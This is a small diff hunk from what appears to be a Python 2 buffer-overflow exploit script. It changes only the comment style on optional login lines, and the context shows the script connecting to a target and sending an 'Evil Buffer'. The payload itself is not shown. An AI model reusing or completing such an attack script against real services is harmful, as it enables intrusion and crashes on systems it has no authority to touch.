@@ -67,12 +67,12 @@ print "[*] Connecting."
 pwn.connect((host, host_port))
 
 ## If connection requires credentials
-## pwn.send("user " + host_user + "\n")
-## msg=pwn.recv(1024)
-## print msg
-## pwn.send("pass " + host_pass + "\n")
-## msg=pwn.recv(1024)
-## print msg
+#pwn.send("user " + host_user + "\n")
+#msg=pwn.recv(1024)
+#print msg
+#pwn.send("pass " + host_pass + "\n")
+#msg=pwn.recv(1024)
+#print msg
 
 print "[*] Sending Evil Buffer ! Size: " + str(len(the_buffer))
 pwn.send(the_buffer + "\n")
